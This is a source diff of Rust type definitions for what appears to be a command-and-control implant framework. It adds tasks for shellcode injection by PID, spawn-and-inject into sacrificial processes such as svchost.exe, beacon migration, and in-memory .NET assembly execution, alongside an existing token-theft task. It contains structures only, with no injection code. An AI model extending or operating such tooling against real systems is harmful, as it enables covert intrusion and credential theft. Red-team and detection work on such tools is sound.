@@ -38,6 +38,13 @@ pub enum TaskType {
     JumpWmi,
     RemoteExec,
     Bof,
+    Inject,
+    Shinject,
+    SpawnInject,
+    Migrate,
+    Spawn,
+    SetSpawnTo,
+    ExecuteAssembly,
 }
 
 /// Command dispatched to agent (server → agent).
@@ -114,6 +121,66 @@ pub struct BofTask {
     pub args_b64: String,
 }
 
+/// inject payload — inject shellcode into a running process by PID.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct InjectTask {
+    pub pid: u32,
+    /// Base64-encoded shellcode bytes.
+    pub shellcode_b64: String,
+}
+
+/// shinject payload — read shellcode from a file path on the agent and inject.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ShinjectTask {
+    pub pid: u32,
+    /// File path on the agent filesystem containing raw shellcode.
+    pub shellcode_path: String,
+}
+
+/// spawn+inject payload — spawn a suspended process and inject shellcode.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SpawnInjectTask {
+    /// Base64-encoded shellcode bytes.
+    pub shellcode_b64: String,
+    /// Override spawn process (default: use agent config spawn_process).
+    #[serde(default)]
+    pub spawn_exe: Option<String>,
+}
+
+/// migrate payload — inject beacon shellcode into target PID, then exit current process.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct MigrateTask {
+    pub pid: u32,
+    /// Base64-encoded beacon shellcode.
+    pub shellcode_b64: String,
+}
+
+/// spawn payload — spawn sacrificial process and inject beacon shellcode.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SpawnTask {
+    /// Base64-encoded beacon shellcode.
+    pub shellcode_b64: String,
+    /// Override spawn process (default: use agent config spawn_process).
+    #[serde(default)]
+    pub spawn_exe: Option<String>,
+}
+
+/// set_spawn_to payload — change the default spawnto process on the agent.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SetSpawnToTask {
+    pub path: String,
+}
+
+/// execute-assembly payload — in-memory .NET assembly execution.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ExecuteAssemblyTask {
+    /// Base64-encoded .NET assembly (EXE) bytes.
+    pub assembly_b64: String,
+    /// Command-line arguments passed to Main(string[] args).
+    #[serde(default)]
+    pub args: Vec<String>,
+}
+
 /// steal_token payload — JSON-encoded in Command.command.
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct StealTokenTask {
@@ -145,6 +212,9 @@ pub struct AgentConfig {
     pub shared_token: String,
     pub alias: Option<String>,
     pub note: Option<String>,
+    /// Default process to spawn for spawn+inject (e.g. "C:\\Windows\\System32\\svchost.exe").
+    #[serde(default)]
+    pub spawn_process: Option<String>,
 }
 
 // ─── Shared API response DTOs (server → CLI) ───
